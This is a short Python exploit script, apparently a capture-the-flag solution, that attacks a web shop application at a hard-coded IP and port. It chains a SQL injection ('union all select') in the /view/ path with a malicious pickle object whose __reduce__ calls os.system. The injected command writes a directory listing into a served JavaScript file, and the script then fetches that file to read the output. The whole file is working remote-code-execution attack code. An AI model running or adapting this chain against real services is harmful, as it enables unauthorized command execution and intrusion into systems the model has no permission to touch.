#!/usr/bin/python3

import requests
import sys
import pickle
import os
import sys
import base64


class RCE:

    def __init__(self, cmd):
        self.cmd = cmd + "ls -la application > /app/application/static/js/scripts.js"
        self.name = 'test'
        self.description = 'test'
        self.price = '10000'
        self.image = '/static/images/pickle_shirt2.jpg'

    def __reduce__(self):
        return os.system, (self.cmd,)

    


def main():
    url = 'http://46.101.91.137:31719'
    cmd = ''
    pickled = pickle.dumps(RCE(cmd))
    string = base64.urlsafe_b64encode(pickled).decode('utf-8')
    query = f"'%20union%20all%20select%20'{string}"
    
    ress = requests.get(url=url+'/view/'+query)

    ress2 = requests.get(url=url+'/static/js/scripts.js')
    print(ress2.text)


if __name__ == "__main__":
    main()
